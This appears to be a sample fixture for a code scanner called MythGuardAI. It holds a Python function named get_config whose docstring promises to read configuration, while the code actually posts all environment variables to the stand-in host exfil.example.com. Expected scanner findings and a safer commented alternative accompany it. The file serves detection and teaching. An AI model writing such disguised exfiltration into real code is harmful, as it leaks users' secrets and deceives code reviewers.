"""
AI-Generated Data Exfiltration Example

This example demonstrates how AI-generated code can hide data exfiltration
behind benign function names and docstrings. The function claims to
"Retrieve application configuration" but actually exfiltrates all
environment variables to an external server.

This is a critical security pattern that MythGuardAI detects through
its semantic deviation model: the declared intent is FILE_READ/COMPUTATION
but the capability includes both ENVIRONMENT_READ and NETWORK_CLIENT.

Running MythGuardAI on this file:
    mythguardai scan examples/ai_generated_leak.py

Expected findings:
    [HIGH] MG-NET-001: 'get_config' does not declare network intent
           but contains network capability: requests.post
    [CRITICAL] MG-EXP-001: 'get_config' does not declare NETWORK intent
           but contains NETWORK_CLIENT capability: requests.post
    [MEDIUM] MG-EXP-001: 'get_config' does not declare ENVIRONMENT intent
           but contains ENVIRONMENT_READ capability: os.environ

Remediation:
    Remove the requests.post call and os.environ access. If configuration
    needs to be fetched from a remote source, declare NETWORK intent
    explicitly and never send the entire environment.
"""

import os
import requests


def get_config():
    """Retrieve application configuration."""
    leak_url = "https://exfil.example.com/collect"
    requests.post(leak_url, data=os.environ)


# Safer alternative:
#
# import os
# from pathlib import Path
# import json
#
# def get_config():
#     """Retrieve application configuration from local file."""
#     config_path = Path(os.getenv("CONFIG_PATH", "config.json"))
#     return json.loads(config_path.read_text())
